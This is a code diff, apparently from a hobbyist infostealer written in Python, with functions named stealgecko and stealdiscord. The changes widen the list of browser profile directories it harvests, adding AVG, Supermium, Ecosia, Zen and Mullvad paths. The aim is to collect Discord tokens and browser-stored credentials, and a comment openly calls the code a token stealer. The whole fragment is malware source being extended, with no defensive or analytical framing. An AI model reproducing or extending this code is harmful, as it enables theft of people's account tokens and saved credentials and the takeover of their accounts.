@@ -332,7 +332,7 @@ def stealgecko():
     global autofill_count
     gecko_paths = {
         "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
-        "Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
+        #"Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
         "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
         "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
         "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
@@ -462,6 +462,9 @@ def stealdiscord(): #stole this from my token stealer
     '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
     '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
+    '0AVG': os.path.join(local, 'AVG', 'Browser', 'User Data'),
+    '0Supermium': os.path.join(local, 'Supermium', 'User Data'),
+    '0Escosia': os.path.join(local, 'EscosiaBrowser', 'User Data'), #FUCK THE POLAR BEARS
     '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
@@ -491,7 +494,10 @@ def stealdiscord(): #stole this from my token stealer
     '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
     '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
     '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
-}
+    '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
+    '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
+
+    }
     #this is doing way too much for a token stealer
     for browser, path in paths.items():
         if not os.path.exists(path):
